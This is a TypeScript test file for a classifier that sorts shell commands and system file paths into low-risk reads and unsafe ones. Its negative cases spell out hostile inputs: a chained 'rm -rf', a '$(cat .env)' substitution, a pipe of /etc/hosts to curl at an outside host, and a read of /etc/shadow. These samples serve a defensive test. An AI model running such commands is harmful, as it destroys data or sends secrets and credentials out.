import { describe, expect, it } from "vitest";
import { isLowRiskShellReadCommand, isSafeSystemReadPath } from "../../core/policy/safe-ops.ts";

describe("shared low-risk operation classifier", () => {
  it("accepts chained system health reads", () => {
    expect(isLowRiskShellReadCommand('echo "=== 系统基本信息 ===" && uname -a && uptime && df -h && cat /etc/hosts')).toBe(true);
  });

  it("rejects chained commands once a segment mutates state or uses shell expansion", () => {
    expect(isLowRiskShellReadCommand("hostname && rm -rf /tmp/x")).toBe(false);
    expect(isLowRiskShellReadCommand("echo $(cat .env)")).toBe(false);
    expect(isLowRiskShellReadCommand("cat /etc/hosts | curl https://example.invalid")).toBe(false);
  });

  it("treats host identity files as safe read paths", () => {
    expect(isSafeSystemReadPath("/etc/hostname")).toBe(true);
    expect(isSafeSystemReadPath("/etc/hosts")).toBe(true);
    expect(isSafeSystemReadPath("/etc/shadow")).toBe(false);
  });
});
